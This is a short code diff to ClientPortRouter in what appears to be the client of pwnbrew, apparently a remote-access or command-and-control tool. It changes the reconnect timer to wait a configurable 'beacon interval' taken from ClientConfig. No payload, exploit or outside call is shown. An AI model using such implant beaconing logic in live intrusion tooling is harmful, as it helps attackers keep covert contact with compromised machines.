@@ -41,6 +41,7 @@ package pwnbrew.network;
 import java.io.IOException;
 import java.util.Calendar;
 import java.util.Date;
+import pwnbrew.ClientConfig;
 import pwnbrew.manager.ConnectionManager;
 import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.manager.PortManager;
@@ -116,6 +117,9 @@ public class ClientPortRouter extends PortRouter {
         
         if( reconnectEnable ){
             
+            ClientConfig theConf = ClientConfig.getConfig();
+            int beaconInterval = theConf.getBeaconInterval();
+            
             //DebugPrinter.printMessage(NAME_Class, "Starting Reconnect Timer");
             aReconnectTimer.clearTimes();
                         
@@ -124,7 +128,7 @@ public class ClientPortRouter extends PortRouter {
             theCalendar.setTime( new Date() );
             
             //Add 1 Second
-            //theCalendar.add( Calendar.SECOND, 1);
+            theCalendar.add( Calendar.SECOND, beaconInterval);
             Date aTime = theCalendar.getTime();
             
             
